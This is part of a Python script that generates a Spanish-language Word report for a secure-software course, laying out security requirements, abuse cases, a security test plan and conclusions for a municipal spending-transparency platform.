        ("Autenticidad: ", "Firma digital verificable por cualquier ciudadano en datos publicados."),
    ]
    for label, val in attrs:
        bp = doc.add_paragraph(style="List Bullet")
        r1 = bp.add_run(label)
        run_fmt(r1, size=11, bold=True, color=AZUL_ODS)
        r2 = bp.add_run(val)
        run_fmt(r2, size=11, color=GRIS_OSCURO)

    p_warn = doc.add_paragraph()
    para_fmt(p_warn, space_before=6, space_after=6)
    r_warn = p_warn.add_run(
        "Nota de sensibilidad: La plataforma opera en un contexto de alto escrutinio político. "
        "Un incidente de seguridad no es solo un problema técnico, es una crisis institucional "
        "con impacto directo en la democracia municipal."
    )
    run_fmt(r_warn, size=10, italic=True, color=NARANJA)

    add_separator(doc)


def seccion_requisitos(doc):
    add_heading(doc, "2. Requisitos de Seguridad", level=1)

    p_intro = doc.add_paragraph()
    r_intro = p_intro.add_run(
        "Se definen 10 requisitos de seguridad (funcionales y no funcionales) que debe cumplir "
        "GastoTransparente Municipal, alineados con los principios de la tríada CIA y las "
        "recomendaciones de OWASP."
    )
    run_fmt(r_intro, size=11, color=GRIS_OSCURO)

    # Tabla
    table = doc.add_table(rows=1, cols=5)
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    headers = ["ID", "Tipo", "Requisito", "Descripción", "Justificación"]
    widths_cm = [1.5, 2.5, 3.5, 6.0, 5.5]
    hrow = table.rows[0]
    for i, (h, w) in enumerate(zip(headers, widths_cm)):
        cell = hrow.cells[i]
        cell.width = Cm(w)
        set_cell_bg(cell, AZUL_ODS)
        p = cell.paragraphs[0]
        r = p.add_run(h)
        run_fmt(r, size=10, bold=True, color=BLANCO)
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER

    for idx, req in enumerate(REQUISITOS):
        row = table.add_row()
        bg = GRIS_CLARO if idx % 2 == 0 else BLANCO
        values = [req[0], req[1], req[2], req[3], req[4]]
        tipo_color = AZUL_CLARO if req[1] == "Funcional" else NARANJA
        for i, (val, w) in enumerate(zip(values, widths_cm)):
            cell = row.cells[i]
            cell.width = Cm(w)
            set_cell_bg(cell, bg)
            p = cell.paragraphs[0]
            tc = GRIS_OSCURO
            bold = False
            if i == 0:
                tc = AZUL_ODS; bold = True
            elif i == 1:
                tc = tipo_color; bold = True
            r = p.add_run(val)
            run_fmt(r, size=9, bold=bold, color=tc)

    add_separator(doc)


def seccion_casos_abuso(doc):
    add_heading(doc, "3. Casos de Abuso", level=1)

    p_intro = doc.add_paragraph()
    r_intro = p_intro.add_run(
        "Se identifican 10 casos de abuso pensados desde la perspectiva del atacante (threat modeling ofensivo). "
        "Cada caso describe el atacante, el objetivo del ataque, las acciones realizadas, el impacto potencial "
        "y las contramedidas de mitigación."
    )
    run_fmt(r_intro, size=11, color=GRIS_OSCURO)
    doc.add_paragraph()

    for caso in CASOS_ABUSO:
        risk_color = COLORES_RIESGO.get(caso["riesgo"], GRIS_OSCURO)

        # Encabezado del caso
        h = doc.add_heading(f"{caso['id']} — {caso['nombre']}", level=2)
        for run in h.runs:
            run.font.color.rgb = RGBColor.from_string(AZUL_ODS)

        # Tabla resumen del caso
        tbl = doc.add_table(rows=2, cols=2)
        tbl.style = "Table Grid"

        # Fila 1: Riesgo y Probabilidad/Impacto
        tbl.rows[0].cells[0].merge(tbl.rows[0].cells[1])
        cell_titulo = tbl.rows[0].cells[0]
        set_cell_bg(cell_titulo, risk_color)
        p_t = cell_titulo.paragraphs[0]
        r_t = p_t.add_run(f"Nivel de Riesgo: {caso['riesgo']}  |  Probabilidad: {caso['probabilidad']}  |  Impacto: {caso['impacto_nivel']}")
        run_fmt(r_t, size=11, bold=True, color=BLANCO)
        p_t.alignment = WD_ALIGN_PARAGRAPH.CENTER

        cell_a = tbl.rows[1].cells[0]
        set_cell_bg(cell_a, GRIS_CLARO)
        p_a = cell_a.paragraphs[0]
        r_a1 = p_a.add_run("Atacante: ")
        run_fmt(r_a1, size=10, bold=True, color=AZUL_ODS)
        r_a2 = p_a.add_run(caso["atacante"])
        run_fmt(r_a2, size=10, color=GRIS_OSCURO)

        cell_b = tbl.rows[1].cells[1]
        set_cell_bg(cell_b, GRIS_CLARO)
        p_b = cell_b.paragraphs[0]
        r_b1 = p_b.add_run("Objetivo: ")
        run_fmt(r_b1, size=10, bold=True, color=AZUL_ODS)
        r_b2 = p_b.add_run(caso["objetivo"])
        run_fmt(r_b2, size=10, color=GRIS_OSCURO)

        doc.add_paragraph()

        # Tabla de detalle
        tbl2 = doc.add_table(rows=3, cols=2)
        tbl2.style = "Table Grid"
        col_labels = ["Acciones del Atacante", "Impacto Potencial", "Mitigaciones"]
        col_data   = [
            "\n".join(f"  {i+1}. {a}" for i, a in enumerate(caso["acciones"])),
            caso["impacto"],
            "\n".join(f"  ✓ {m}" for m in caso["mitigaciones"]),
        ]
        col_label_colors = [AZUL_CLARO, ROJO, VERDE]
        col_bg_colors    = [GRIS_CLARO, "FDE8E8", "E8F8F1"]

        for row_i in range(3):
            tbl2.rows[row_i].cells[0].width = Cm(4)
            tbl2.rows[row_i].cells[1].width = Cm(15)
            cell_label = tbl2.rows[row_i].cells[0]
            set_cell_bg(cell_label, col_label_colors[row_i])
            p_l = cell_label.paragraphs[0]
            r_l = p_l.add_run(col_labels[row_i])
            run_fmt(r_l, size=10, bold=True, color=BLANCO)
            cell_label.vertical_alignment = WD_ALIGN_VERTICAL.CENTER

            cell_val = tbl2.rows[row_i].cells[1]
            set_cell_bg(cell_val, col_bg_colors[row_i])
            p_v = cell_val.paragraphs[0]
            tc = ROJO if row_i == 1 else VERDE if row_i == 2 else GRIS_OSCURO
            bold_val = row_i == 1
            r_v = p_v.add_run(col_data[row_i])
            run_fmt(r_v, size=10, bold=bold_val, color=tc)

        doc.add_paragraph()
        add_separator(doc, AZUL_CLARO)
        doc.add_paragraph()


def seccion_pruebas(doc):
    add_heading(doc, "4. Plan de Pruebas de Seguridad Basadas en Riesgo", level=1)

    p_intro = doc.add_paragraph()
    r_intro = p_intro.add_run(
        "Por cada caso de abuso se define una prueba de seguridad con objetivo, procedimiento, "
        "resultado esperado y criterio de éxito verificable, alineada con la metodología OWASP Testing Guide."
    )
    run_fmt(r_intro, size=11, color=GRIS_OSCURO)
    doc.add_paragraph()

    for prueba in PRUEBAS:
        ca_obj = next((c for c in CASOS_ABUSO if c["id"] == prueba["ca"]), {})
        risk_color = COLORES_RIESGO.get(ca_obj.get("riesgo", "MEDIO"), GRIS_OSCURO)

        # Encabezado
        h = doc.add_heading(f"Prueba {prueba['ca']} — {ca_obj.get('nombre', '')}", level=2)
        for run in h.runs:
            run.font.color.rgb = RGBColor.from_string(GRIS_OSCURO)

        tbl = doc.add_table(rows=5, cols=2)
        tbl.style = "Table Grid"

        # Fila de riesgo
        tbl.rows[0].cells[0].merge(tbl.rows[0].cells[1])
        cell_r = tbl.rows[0].cells[0]
        set_cell_bg(cell_r, risk_color)
        p_r = cell_r.paragraphs[0]
        r_r = p_r.add_run(f"Riesgo del Caso: {ca_obj.get('riesgo', '')}  |  Probabilidad: {ca_obj.get('probabilidad', '')}  |  Impacto: {ca_obj.get('impacto_nivel', '')}")
        run_fmt(r_r, size=10, bold=True, color=BLANCO)
        p_r.alignment = WD_ALIGN_PARAGRAPH.CENTER

        campos = [
            ("Objetivo de la Prueba",  prueba["objetivo"],            AZUL_ODS,   GRIS_CLARO),
            ("Procedimiento",          prueba["procedimiento"],       AZUL_CLARO, BLANCO),
            ("Resultado Esperado",     prueba["resultado_esperado"], VERDE,      "E8F8F1"),
            ("Criterio de Éxito",      prueba["criterio"],           NARANJA,    "FEF9E7"),
        ]
        for row_i, (label, val, lc, bc) in enumerate(campos):
            row = tbl.rows[row_i + 1]
            row.cells[0].width = Cm(4)
            row.cells[1].width = Cm(15)
            cell_l = row.cells[0]
            set_cell_bg(cell_l, lc)
            p_l = cell_l.paragraphs[0]
            r_l = p_l.add_run(label)
            run_fmt(r_l, size=10, bold=True, color=BLANCO)
            cell_l.vertical_alignment = WD_ALIGN_VERTICAL.CENTER

            cell_v = row.cells[1]
            set_cell_bg(cell_v, bc)
            p_v = cell_v.paragraphs[0]
            r_v = p_v.add_run(val)
            run_fmt(r_v, size=10, color=GRIS_OSCURO)

        doc.add_paragraph()
        add_separator(doc, GRIS_OSCURO)
        doc.add_paragraph()


def seccion_conclusiones(doc):
    add_heading(doc, "5. Conclusiones", level=1)
    items = [
        ("Requisitos de seguridad (RS-01 a RS-13): ",
         "Cubren autenticación MFA, cifrado AES-256/TLS 1.3, trazabilidad inmutable, protección DDoS, RBAC, firma digital, "
         "gestión de sesiones, validación de entradas, política de contraseñas, alertas SIEM, validación estricta de JWT, "
         "atomicidad en aprobación multi-firma y correlación multi-vector en SIEM."),
        ("13 Casos de Abuso identificados: ",
         "Desde amenazas internas (funcionario malicioso, race condition) hasta ataques externos (DDoS, SQLi, XSS, IDOR, "
         "Defacement, Malware Upload) y vectores avanzados (JWT manipulation, exfiltración multi-vector encubierta)."),
        ("4 Casos de Riesgo Crítico: ",
         "CA-01 (manipulación interna), CA-02 (DDoS electoral), CA-05 (phishing) y CA-11 (escalada JWT) "
         "requieren mitigación inmediata antes del despliegue."),
        ("Plan de Pruebas verificable: ",
         "13 pruebas con procedimiento concreto, herramientas (SQLMap, JMeter, Hydra, Burp Suite, Apache Benchmark) "
         "y criterio de éxito medible."),
        ("Principio aplicado — Think like an attacker: ",
         "El modelado de amenazas desde la perspectiva ofensiva permite fortalecer las defensas antes del despliegue, "
         "reduciendo el costo de remediación y protegiendo la confianza pública en la institución municipal."),
    ]
    for label, val in items:
        bp = doc.add_paragraph(style="List Bullet")
        r1 = bp.add_run(label)
        run_fmt(r1, size=11, bold=True, color=AZUL_ODS)
        r2 = bp.add_run(val)
        run_fmt(r2, size=11, color=GRIS_OSCURO)

    doc.add_paragraph()
    p_final = doc.add_paragraph()
    para_fmt(p_final, align=WD_ALIGN_PARAGRAPH.CENTER, space_before=12)
    r_final = p_final.add_run(
        "Un sistema de transparencia solo es confiable si su seguridad es robusta.\n"
        "GastoTransparente Municipal — ODS 16 — Software Seguro 2026"
    )
    run_fmt(r_final, size=12, bold=True, italic=True, color=AZUL_ODS)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    doc = Document()

    # Márgenes
    for section in doc.sections:
        section.top_margin    = Cm(2.0)
        section.bottom_margin = Cm(2.0)
        section.left_margin   = Cm(2.5)
        section.right_margin  = Cm(2.5)

    portada(doc)
    seccion_contexto(doc)
    seccion_requisitos(doc)
    doc.add_page_break()
    seccion_casos_abuso(doc)
    doc.add_page_break()
    seccion_pruebas(doc)
    doc.add_page_break()
    seccion_conclusiones(doc)

    out = r"C:\Users\cuent\Documents\Universidad\2026-02\Soft Seguro\Guia 4\CasosDeAbuso_GastoTransparente_ODS16.docx"
    doc.save(out)
    print(f"[OK] Documento guardado: {out}")


if __name__ == "__main__":
    main()
